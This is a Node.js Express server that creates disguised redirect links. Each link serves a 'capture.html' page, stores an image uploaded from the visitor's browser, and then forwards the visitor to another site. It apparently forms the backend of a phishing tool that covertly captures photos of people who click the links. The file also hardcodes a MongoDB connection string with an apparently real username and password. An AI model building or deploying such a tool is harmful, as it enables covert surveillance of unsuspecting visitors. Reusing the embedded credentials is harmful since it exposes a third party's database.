const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const fs = require('fs');

const app = express();

mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dartmino64:CXd21bYqriwfgtUN@cluster0.p7eujjb.mongodb.net/urlcapture?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const urlSchema = new mongoose.Schema({
  originalUrl: String,
  newUrl: String,
  redirectUrl: String,
  imagePath: String
});
const Url = mongoose.model('Url', urlSchema);

app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/generate', async (req, res) => {
  try {
    const { originalUrl, redirectUrl } = req.body;
    const host = req.get('host');
    const newUrl = `https://${host}/${Math.random().toString(36).substring(7)}`;
    const url = new Url({ originalUrl, newUrl, redirectUrl });
    await url.save();
    console.log('URL saved:', url);
    res.json({ newUrl });
  } catch (error) {
    console.error('Error generating URL:', error);
    res.status(500).send('Server error');
  }
});

app.get('/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const url = await Url.findOne({ newUrl: `https://${req.get('host')}/${id}` });
    if (url) {
      res.sendFile(path.join(__dirname, 'public', 'capture.html'));
    } else {
      res.status(404).send('Not Found');
    }
  } catch (error) {
    console.error('Error fetching URL:', error);
    res.status(500).send('Server error');
  }
});

app.post('/upload', async (req, res) => {
  try {
    const imageData = req.body.image;
    const id = req.body.id;
    const base64Data = imageData.replace(/^data:image\/png;base64,/, '');
    const filePath = path.join(__dirname, 'uploads', `image_${Date.now()}.png`);

    fs.writeFile(filePath, base64Data, 'base64', async (err) => {
      if (err) {
        return res.status(500).send('Error saving image');
      }
      const url = await Url.findOne({ newUrl: `https://${req.get('host')}/${id}` });
      if (url) {
        url.imagePath = filePath;
        await url.save();
        res.json({ redirectUrl: url.redirectUrl });
      } else {
        res.status(404).send('Not Found');
      }
    });
  } catch (error) {
    console.error('Error uploading image:', error);
    res.status(500).send('Server error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
